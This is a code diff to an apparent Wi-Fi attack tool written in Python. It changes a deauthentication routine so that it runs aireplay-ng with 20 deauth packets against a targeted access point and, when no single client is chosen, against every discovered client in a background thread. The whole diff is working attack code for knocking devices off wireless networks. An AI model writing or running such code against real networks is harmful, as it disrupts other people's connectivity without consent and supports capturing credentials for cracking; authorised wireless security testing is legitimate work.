@@ -217,12 +217,23 @@ class WifiMultiToolView:
 
     def _do_deauth(self) -> None:
         if not self.mon_iface or not self.targeted_ap: return
-        cmd = ["aireplay-ng", "--deauth", "5", "-a", self.targeted_ap.bssid]
-        if self.client_cursor > 0:
-            cmd += ["-c", self.clients[self.client_cursor - 1].mac]
-        cmd.append(self.mon_iface)
-        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        self.deauth_count += 1
+        
+        target_macs = []
+        if self.client_cursor > 0 and self.client_cursor - 1 < len(self.clients):
+            target_macs.append(self.clients[self.client_cursor - 1].mac)
+        else:
+            target_macs.append(None)
+            target_macs.extend([c.mac for c in self.clients])
+
+        def _worker():
+            for mac in target_macs:
+                cmd = ["aireplay-ng", "--deauth", "20", "-a", self.targeted_ap.bssid]
+                if mac: cmd += ["-c", mac]
+                cmd.append(self.mon_iface)
+                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.deauth_count += 1
+
+        threading.Thread(target=_worker, daemon=True).start()
 
     # --- Lifecycle ---
 
